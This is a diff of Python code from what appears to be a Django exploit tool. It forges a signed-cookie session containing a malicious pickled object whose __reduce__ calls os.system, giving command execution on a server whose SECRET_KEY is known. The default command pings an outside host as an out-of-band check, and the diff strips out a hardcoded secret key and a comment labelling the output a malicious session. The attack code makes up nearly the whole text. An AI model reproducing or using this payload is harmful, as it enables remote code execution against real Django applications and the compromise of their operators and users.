@@ -37,11 +37,8 @@ def session_gen(SECRET_KEY,command = 'ping -n 3 test.0y0.link || ping -c test.0y
         def __reduce__(self):
             #return (os.system,('ping test.0y0.link',))
             return (os.system,(command,))
-
-    #SECRET_KEY = '1bb8)i&dl9c5=npkp248gl&aji7^x6izh3!itsmb6&yl!fak&f'
     SECRET_KEY = SECRET_KEY
     sess = signing.dumps(Run(), key = SECRET_KEY,serializer=PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies')
-    #生成的恶意session
     print sess
     session = 'sessionid={0}'.format(sess)
     return session
